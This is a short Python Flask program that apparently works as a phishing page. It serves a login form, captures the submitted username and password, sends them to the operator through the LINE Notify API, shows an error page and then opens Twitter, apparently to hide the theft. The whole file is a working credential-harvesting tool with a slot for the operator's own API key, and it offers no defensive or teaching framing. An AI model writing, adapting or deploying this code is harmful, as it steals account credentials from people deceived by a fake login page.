from flask import Flask, render_template, request
import requests
import webbrowser as wb

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/", methods=["POST"])
def error():
    user_name = request.form.get("user")
    user_password = request.form.get("pwd")

    message = " "+"\n"+"Username : "+user_name+"\n"+"Password : "+user_password

    def main():
        send_line_notify(message)

    def send_line_notify(notification_message):
        line_notify_token = 'Input your API key!!!'
        line_notify_api = 'https://notify-api.line.me/api/notify'
        headers = {'Authorization': f'Bearer {line_notify_token}'}
        data = {'message': notification_message}
        requests.post(line_notify_api, headers = headers, data = data)

    main()
    
    return render_template("error.html"), wb.open("https://twitter.com/")

if __name__ == "__main__":
    app.run(debug=True)
